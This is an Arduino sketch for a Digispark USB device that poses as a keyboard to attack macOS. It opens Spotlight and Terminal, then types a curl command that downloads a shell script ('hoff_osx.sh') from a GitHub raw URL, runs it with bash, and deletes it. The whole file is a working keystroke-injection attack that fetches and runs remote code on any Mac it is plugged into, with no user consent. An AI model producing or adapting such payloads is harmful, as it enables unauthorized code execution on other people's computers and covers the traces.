#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}

void p(char *line) {
  DigiKeyboard.print(line);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  p("terminal");
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  p("curl -s -o ~/h.sh https://raw.githubusercontent.com/rmilne/hoffer/master/hoff_osx.sh");
  DigiKeyboard.delay(500);
  p("bash ~/h.sh ; rm ~/h.sh ; exit");
  for(;;){ 
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(1, LOW);
    delay(100);
  }
}

